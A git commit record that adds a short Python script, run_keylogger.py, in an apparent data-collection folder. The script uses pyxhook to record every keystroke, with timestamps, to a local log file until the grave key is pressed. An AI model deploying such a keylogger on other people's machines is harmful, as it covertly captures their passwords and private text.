ca21dbbd89158014317ff49ff11e858945108b13
Raymond Lee <11689554+rleekc@users.noreply.github.com>
2019-07-27 12:53:08 -0700

    Update run_keylogger.py

---
+++ collectdata/run_keylogger.py
@@ -0,0 +1,25 @@
+#apt-get install python-xlib
+#pip install pyxhook
+
+import pyxhook
+import time
+
+log_file='log.log'
+
+def OnKeyPress(event):
+  fob=open(log_file,'a')
+  fob.write(time.asctime() +' ')
+  fob.write(event.Key)
+  fob.write('\n')
+
+  if event.Ascii==96: #96 is the ascii value of the grave key (`)
+    fob.close()
+    new_hook.cancel()
+#instantiate HookManager class
+new_hook=pyxhook.HookManager()
+#listen to all keystrokes
+new_hook.KeyDown=OnKeyPress
+#hook the keyboard
+new_hook.HookKeyboard()
+#start the session
+new_hook.start()
